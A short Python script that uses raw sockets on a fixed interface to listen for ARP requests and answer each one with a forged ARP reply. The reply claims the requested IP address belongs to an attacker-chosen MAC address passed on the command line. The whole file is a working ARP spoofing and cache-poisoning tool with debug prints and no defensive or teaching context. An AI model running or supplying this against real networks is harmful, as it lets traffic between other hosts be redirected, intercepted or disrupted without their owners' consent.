import socket
import struct
import binascii
import queue
import threading
import sys
import codecs
mysocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
mysocket_s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
#interface_card = raw_input("Enter the interfacecard\t")
#mysocket_s.bind(('ens33',socket.htons(0x0806)))
mysocket_s.bind(("ens33", socket.htons(0x0003)))

Q = queue.Queue()

def arp_receiver():

	while True:
		pkt  = mysocket.recvfrom(1024)
		ethhead = pkt[0][0:14]
		eth = struct.unpack("!6s6s2s",ethhead)
		print ("--------Ethernet Frame--------")
		#print eth
		binascii.hexlify(eth[2])
		arp_h = pkt[0][14:42]
		arp_l = struct.unpack("!2s2sss2s6s4s6s4s",arp_h)
		print ("okok", arp_l[4])
		if arp_l[4] == b'\x00\x01':
			Q.put([eth,arp_l])
			print ("Done")

def arp_sender():
	while True:
		main_list = Q.get()
		#print "main list", main_list
		eth_header = main_list[0]
		arp_packet = main_list[1]
		#print eth_header, type(eth_header)
		mac_sender= (codecs.decode(sys.argv[1], 'hex'))
		#mac_sender = sys.argv[1].decode('hex')
		print ("mac1", mac_sender)
		print ("eth ",type(eth_header[1]))
		print ("mac",type(mac_sender))
		print ("ethlast ",type(eth_header[-1]))
		eth1 = eth_header[1]+mac_sender+eth_header[-1]
		arp1 = "".join([each.decode() for each in arp_packet[0:4]])
		arp1 = arp1.encode()
		print ("arp1 ", arp_packet[-1])
		arp1 = arp1+b'\x00\x02'+mac_sender+ arp_packet[-1]+arp_packet[5]+arp_packet[6]
		target_packet = eth1+arp1
		#print 'target', arp1
		print ("target ", target_packet)
		mysocket_s.send(target_packet)
		print ("Done123")

r = threading.Thread(target=arp_receiver)

s = threading.Thread(target=arp_sender)
r.start()
s.start()



